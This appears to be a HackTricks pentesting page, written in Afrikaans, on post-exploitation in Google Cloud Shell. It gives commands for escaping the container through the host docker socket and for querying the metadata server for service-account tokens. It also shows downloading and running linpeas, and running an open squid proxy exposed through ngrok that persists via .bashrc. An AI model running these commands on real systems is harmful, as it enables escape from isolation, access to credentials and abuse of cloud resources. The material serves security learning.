# GCP - Cloud Shell Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Vir meer inligting oor Cloud Shell, kyk:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Container Escape

Let daarop dat die Google Cloud Shell binne 'n container loop, jy kan **maklik na die gasheer ontsnap** deur te doen:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
Dit word nie as 'n kwesbaarheid deur Google beskou nie, maar dit gee jou 'n breër visie van wat in daardie omgewing gebeur.

Boonop, let daarop dat jy vanaf die gasheer 'n diensrekeningtoken kan vind:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Met die volgende omvang:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
```markdown
### Enumerate metadata with LinPEAS:

LinPEAS is a script that can be used to enumerate various information on a system, including metadata. To use LinPEAS for metadata enumeration, follow these steps:

1. Download LinPEAS from the official repository.
2. Upload the script to the target environment.
3. Execute the script to gather metadata information.

The output will provide insights into the system's configuration, user accounts, and other relevant details.
```
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
Na gebruik van [https://github.com/carlospolop/bf_my_gcp_permissions](https://github.com/carlospolop/bf_my_gcp_permissions) met die token van die Diensrekening **is daar geen toestemmings ontdek nie**...

### Gebruik dit as 'n Proxy

As jy jou google cloud shell instansie as 'n proxy wil gebruik, moet jy die volgende opdragte uitvoer (of dit in die .bashrc-lêer invoeg):
```bash
sudo apt install -y squid
```
Just vir jou inligting, Squid is 'n http-proxybediener. Skep 'n **squid.conf** lêer met die volgende instellings:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
kopieer die **squid.conf** lêer na **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
Uiteindelik, voer die squid diens uit:
```bash
sudo service squid start
```
Gebruik ngrok om die proxy van buite beskikbaar te stel:
```bash
./ngrok tcp 3128
```
Na die uitvoering van copy die tcp:// url. As jy die proxy vanaf 'n blaaskans wil uitvoer, word dit voorgestel om die tcp:// deel en die poort te verwyder en die poort in die poortveld van jou blaaskans se proxy-instellings te plaas (squid is 'n http proxy bediener).

Vir beter gebruik by opstart moet die .bashrc-lêer die volgende lyne hê:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
Die instruksies is gekopieer van [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Kyk na daardie bladsy vir ander mal idees om enige soort sagteware (databasisse en selfs Windows) in Cloud Shell te loop.

{{#include ../../../banners/hacktricks-training.md}}
